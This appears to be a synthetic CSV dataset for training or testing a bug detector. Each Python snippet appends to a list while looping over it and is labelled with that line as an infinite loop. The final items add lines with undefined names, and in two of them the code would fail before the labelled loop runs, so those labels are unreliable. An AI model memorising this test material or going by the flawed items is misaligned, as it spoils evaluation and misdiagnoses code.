input,output
"l = [1,2,3,4]
for i in l:
    l.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   fh = [1, 2, 3, 4]
2   for bar in fh:
3       fh.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   reduce = [1, 2, 3, 4]
2   for dmin in reduce:
3       reduce.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   DISCRETE_KINDS = [1, 2, 3, 4]
2   for dataspace_is_numerical in DISCRETE_KINDS:
3       DISCRETE_KINDS.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   SECONDS = [1, 2, 3, 4]
2   for domain in SECONDS:
3       SECONDS.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   self = [1, 2, 3, 4]
2   for minor_breaks in self:
3       self.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   _trans = [1, 2, 3, 4]
2   for timedelta_format in _trans:
3       _trans.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   NANOSECONDS = [1, 2, 3, 4]
2   for lru_cache in NANOSECONDS:
3       NANOSECONDS.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   OrderedDict = [1, 2, 3, 4]
2   for logit_trans in OrderedDict:
3       OrderedDict.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   v1 = [1, 2, 3, 4]
2   for abstractmethod in v1:
3       v1.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   dmin = [1, 2, 3, 4]
2   for span in dmin:
3       dmin.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   trans_minor_breaks = [1, 2, 3, 4]
2   for _get in trans_minor_breaks:
3       trans_minor_breaks.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   log10_trans = [1, 2, 3, 4]
2   for nomatch in log10_trans:
3       log10_trans.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   trans_new = [1, 2, 3, 4]
2   for num2date in trans_new:
3       trans_new.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   min_max = [1, 2, 3, 4]
2   for args in min_max:
3       min_max.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   n = [1, 2, 3, 4]
2   for delta in n:
3       n.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   min_max = [1, 2, 3, 4]
2   for _format in min_max:
3       min_max.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   v2 = [1, 2, 3, 4]
2   for _x in v2:
3       v2.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   abstractmethod = [1, 2, 3, 4]
2   for i in abstractmethod:
3       abstractmethod.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   b = [1, 2, 3, 4]
2   for extended_breaks in b:
3       b.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   v2_indices = [1, 2, 3, 4]
2   for _trans in v2_indices:
3       v2_indices.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   user_input = [1, 2, 3, 4]
2   for log10_trans in user_input:
3       user_input.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   ABC = [1, 2, 3, 4]
2   for finite in ABC:
3       ABC.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   attr = [1, 2, 3, 4]
2   for func in attr:
3       attr.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   numbers = [1, 2, 3, 4]
2   for _get in numbers:
3       numbers.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   vmin = [1, 2, 3, 4]
2   for obj in vmin:
3       vmin.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   dataspace_is_numerical = [1, 2, 3, 4]
2   for lru_cache in dataspace_is_numerical:
3       dataspace_is_numerical.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   var = [1, 2, 3, 4]
2   for limits in var:
3       var.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   ABC = [1, 2, 3, 4]
2   for chain in ABC:
3       ABC.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   transform = [1, 2, 3, 4]
2   for DISCRETE_KINDS in transform:
3       transform.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   CONTINUOUS_KINDS = [1, 2, 3, 4]
2   for lru_cache in CONTINUOUS_KINDS:
3       CONTINUOUS_KINDS.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   num2date = [1, 2, 3, 4]
5   for name in num2date:
6       num2date.append(1)
7   import datetime
8   na_rm: str = i.date.today().strftime('%y-%m-%d')
",6 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   timedelta_format = [1, 2, 3, 4]
4   for attr in timedelta_format:
5       timedelta_format.append(1)
6   import datetime
7   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   a = [1, 2, 3, 4]
4   for n in a:
5       a.append(1)
6   import datetime
7   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
